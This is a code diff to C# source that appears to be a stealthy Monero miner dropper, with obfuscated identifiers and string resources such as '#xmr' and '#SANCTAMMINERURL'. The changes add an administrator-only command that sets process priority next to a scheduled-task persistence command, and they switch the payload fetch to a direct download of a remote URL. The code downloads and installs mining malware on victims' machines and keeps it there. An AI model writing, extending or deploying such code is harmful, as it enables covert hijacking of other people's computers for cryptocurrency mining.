@@ -65,6 +65,7 @@ public partial class RProgram
                         if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         {
                             try{
+                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#PRIORITY"), _rplp_));
                                 _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCH"), _rplp_));
                             }
                             catch(Exception ex){
@@ -198,7 +199,7 @@ public partial class RProgram
                         {
                             try
                             {
-                                _rxm_ = client.DownloadData(client.DownloadString(_rGetString_("#SANCTAMMINERURL")));
+                                _rxm_ = client.DownloadData(_rGetString_("#URL"));
                             }
                             catch(Exception ex){
 #if DefDebug
@@ -227,7 +228,7 @@ public partial class RProgram
                 }
 #else
                 _rxm_ = _rGetTheResource_("#xmr");
-
+#endif
                 try
                 {
                     if (_rxm_.Length > 0)
